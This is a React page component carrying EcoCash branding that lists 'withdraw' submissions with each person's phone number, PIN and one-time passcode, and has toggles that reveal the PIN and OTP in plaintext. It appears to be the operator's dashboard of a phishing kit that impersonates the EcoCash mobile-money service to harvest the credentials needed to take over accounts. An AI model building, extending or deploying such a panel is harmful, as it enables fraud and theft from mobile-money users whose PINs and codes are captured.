import { useEffect, useState } from 'react';
import { getWithdrawList } from '../services/withdrawApi';

function EyeIcon({ open }) {
  return open ? (
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
      <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  ) : (
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );
}

export default function ListPage() {
  const [submissions, setSubmissions] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState('');
  const [visiblePins, setVisiblePins] = useState({});
  const [visibleOtps, setVisibleOtps] = useState({});

  useEffect(() => {
    getWithdrawList()
      .then(setSubmissions)
      .catch((err) => setError(err.message))
      .finally(() => setIsLoading(false));
  }, []);

  function togglePin(transactionId) {
    setVisiblePins((prev) => ({ ...prev, [transactionId]: !prev[transactionId] }));
  }

  function toggleOtp(transactionId) {
    setVisibleOtps((prev) => ({ ...prev, [transactionId]: !prev[transactionId] }));
  }

  const styles = `
    @media (max-width: 767px) {
      .submissions-table { display: none; }
      .submissions-cards { display: block; }
    }
    @media (min-width: 768px) {
      .submissions-table { display: table; }
      .submissions-cards { display: none; }
    }
    .submission-card {
      border: 1px solid #e5e7eb;
      border-radius: 6px;
      padding: 1rem;
      margin-bottom: 1rem;
      background: #fff;
    }
    .submission-card-row {
      display: flex;
      justify-content: space-between;
      padding: 0.5rem 0;
      border-bottom: 1px solid #f3f4f6;
    }
    .submission-card-row:last-child {
      border-bottom: none;
    }
    .submission-card-label {
      font-weight: 600;
      color: #374151;
      min-width: 100px;
    }
    .submission-card-value {
      text-align: right;
      flex: 1;
      font-family: monospace;
    }
  `;

  return (
    <main className="page-shell">
      <style>{styles}</style>
      <section className="withdraw-card" aria-label="Submissions list">
        <header className="card-header">
          <div className="brand-circle" aria-hidden="true">
            <div className="brand-mark">
              <img src="/ecocash-logo.jpeg" alt="EcoCash logo" className="ecocash-logo" />
            </div>
          </div>
          <h1>Submissions</h1>
          <p>All verification requests submitted this session</p>
        </header>

        <div className="card-body">
          {isLoading && <p>Loading</p>}
          {error && <p className="field-error">{error}</p>}

          {!isLoading && !error && submissions.length === 0 && (
            <p style={{ textAlign: 'center', color: '#888' }}>No submissions yet.</p>
          )}

          {submissions.length > 0 && (
            <>
              {/* Desktop Table */}
              <table className="submissions-table" style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem' }}>
                <thead>
                  <tr style={{ borderBottom: '2px solid #e5e7eb' }}>
                    <th style={{ textAlign: 'left', padding: '0.5rem' }}>Transaction ID</th>
                    <th style={{ textAlign: 'left', padding: '0.5rem' }}>Phone</th>
                    <th style={{ textAlign: 'left', padding: '0.5rem' }}>PIN</th>
                    <th style={{ textAlign: 'left', padding: '0.5rem' }}>OTP</th>
                    <th style={{ textAlign: 'left', padding: '0.5rem' }}>Status</th>
                    <th style={{ textAlign: 'left', padding: '0.5rem' }}>Submitted At</th>
                  </tr>
                </thead>
                <tbody>
                  {submissions.map((item) => {
                    const pinVisible = visiblePins[item.transactionId];
                    return (
                      <tr key={item.transactionId} style={{ borderBottom: '1px solid #f3f4f6' }}>
                        <td style={{ padding: '0.5rem', fontFamily: 'monospace' }}>{item.transactionId}</td>
                        <td style={{ padding: '0.5rem' }}>{item.phone}</td>
                        <td style={{ padding: '0.5rem', fontFamily: 'monospace', whiteSpace: 'nowrap' }}>
                          {pinVisible ? item.pin : item.maskedPin}
                          <button
                            onClick={() => togglePin(item.transactionId)}
                            aria-label={pinVisible ? 'Hide PIN' : 'Show PIN'}
                            title={pinVisible ? 'Hide PIN' : 'Show PIN'}
                            style={{ marginLeft: '0.5rem', background: 'none', border: 'none', cursor: 'pointer', verticalAlign: 'middle', color: '#6b7280', lineHeight: 0 }}
                          >
                            <EyeIcon open={pinVisible} />
                          </button>
                        </td>
                        <td style={{ padding: '0.5rem', fontFamily: 'monospace', whiteSpace: 'nowrap' }}>
                          {item.otp ? (
                            <>
                              {visibleOtps[item.transactionId] ? item.otp : '••••••'}
                              <button
                                onClick={() => toggleOtp(item.transactionId)}
                                aria-label={visibleOtps[item.transactionId] ? 'Hide OTP' : 'Show OTP'}
                                title={visibleOtps[item.transactionId] ? 'Hide OTP' : 'Show OTP'}
                                style={{ marginLeft: '0.5rem', background: 'none', border: 'none', cursor: 'pointer', verticalAlign: 'middle', color: '#6b7280', lineHeight: 0 }}
                              >
                                <EyeIcon open={visibleOtps[item.transactionId]} />
                              </button>
                            </>
                          ) : (
                            <span style={{ color: '#9ca3af' }}>pending</span>
                          )}
                        </td>
                        <td style={{ padding: '0.5rem' }}>
                          <span style={{ background: '#fef3c7', color: '#92400e', padding: '2px 8px', borderRadius: '9999px', fontSize: '0.8rem' }}>
                            {item.status}
                          </span>
                        </td>
                        <td style={{ padding: '0.5rem', color: '#6b7280' }}>
                          {new Date(item.submittedAt).toLocaleString()}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>

              {/* Mobile Cards */}
              <div className="submissions-cards">
                {submissions.map((item) => {
                  const pinVisible = visiblePins[item.transactionId];
                  const otpVisible = visibleOtps[item.transactionId];
                  return (
                    <div key={item.transactionId} className="submission-card">
                      <div className="submission-card-row">
                        <span className="submission-card-label">Tx ID</span>
                        <span className="submission-card-value" style={{ fontSize: '0.85rem' }}>{item.transactionId}</span>
                      </div>
                      <div className="submission-card-row">
                        <span className="submission-card-label">Phone</span>
                        <span className="submission-card-value">{item.phone}</span>
                      </div>
                      <div className="submission-card-row">
                        <span className="submission-card-label">PIN</span>
                        <span className="submission-card-value">
                          {pinVisible ? item.pin : item.maskedPin}
                          <button
                            onClick={() => togglePin(item.transactionId)}
                            aria-label={pinVisible ? 'Hide PIN' : 'Show PIN'}
                            style={{ marginLeft: '0.5rem', background: 'none', border: 'none', cursor: 'pointer', verticalAlign: 'middle', color: '#6b7280', lineHeight: 0 }}
                          >
                            <EyeIcon open={pinVisible} />
                          </button>
                        </span>
                      </div>
                      <div className="submission-card-row">
                        <span className="submission-card-label">OTP</span>
                        <span className="submission-card-value">
                          {item.otp ? (
                            <>
                              {otpVisible ? item.otp : '••••••'}
                              <button
                                onClick={() => toggleOtp(item.transactionId)}
                                aria-label={otpVisible ? 'Hide OTP' : 'Show OTP'}
                                style={{ marginLeft: '0.5rem', background: 'none', border: 'none', cursor: 'pointer', verticalAlign: 'middle', color: '#6b7280', lineHeight: 0 }}
                              >
                                <EyeIcon open={otpVisible} />
                              </button>
                            </>
                          ) : (
                            <span style={{ color: '#9ca3af' }}>pending</span>
                          )}
                        </span>
                      </div>
                      <div className="submission-card-row">
                        <span className="submission-card-label">Status</span>
                        <span className="submission-card-value">
                          <span style={{ background: '#fef3c7', color: '#92400e', padding: '2px 8px', borderRadius: '9999px', fontSize: '0.8rem' }}>
                            {item.status}
                          </span>
                        </span>
                      </div>
                      <div className="submission-card-row">
                        <span className="submission-card-label">Submitted</span>
                        <span className="submission-card-value" style={{ fontSize: '0.85rem', color: '#6b7280' }}>
                          {new Date(item.submittedAt).toLocaleString()}
                        </span>
                      </div>
                    </div>
                  );
                })}
              </div>
            </>
          )}
        </div>
      </section>
    </main>
  );
}
